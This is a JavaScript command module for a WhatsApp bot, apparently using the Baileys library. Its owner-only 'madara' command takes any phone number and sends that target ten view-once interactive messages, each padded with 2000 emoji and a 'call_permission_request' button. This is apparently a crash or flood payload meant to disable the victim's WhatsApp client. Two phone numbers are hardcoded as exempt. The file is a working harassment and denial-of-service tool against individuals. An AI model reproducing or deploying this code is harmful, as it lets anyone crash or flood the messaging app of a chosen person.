// commands/madara.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function madaraCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🍥 *Madara Uchiha*\n\nUsage: .madara <number>\nExample: .madara 628123456789\n\n*Perfect Susano'o*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Hashirama*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🍥 *Perfect Susano'o* descending on ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🍥", key: message.key } });

    try {
        for (let i = 0; i < 10; i++) {
            await sock.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: { text: "✦ Ṁȧḋȧṙȧ Üċḧīḧȧ ✦" + "🍥".repeat(2000) },
                            footer: { text: "Perfect Susano'o" },
                            nativeFlowMessage: { buttons: [{ name: "call_permission_request", buttonParamsJson: "" }] }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *Perfect Susano'o* crushed ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🗡️", key: message.key } });

    } catch (error) {
        console.error('[Madara]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Susano'o failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = madaraCommand;